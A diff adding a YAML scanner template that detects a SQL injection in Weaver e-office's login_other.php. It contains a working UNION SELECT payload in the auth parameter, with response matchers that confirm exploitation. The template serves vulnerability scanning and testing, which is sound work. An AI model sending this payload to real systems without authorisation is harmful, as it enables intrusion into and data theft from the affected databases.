@@ -1,0 +1,32 @@
+id: poc-yaml-weaver-e-office-login-other-php-sqli
+info:
+  name: 泛微OA e-office login_other.php SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,e-office
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /E-mobile/Data/login_other.php?diff=sync&auth={"auths":[{"value":"-1' UNION SELECT 1,2,md5({{t1}}),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51#"}]} HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"valuename\""
+          - "{{t2}}"
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
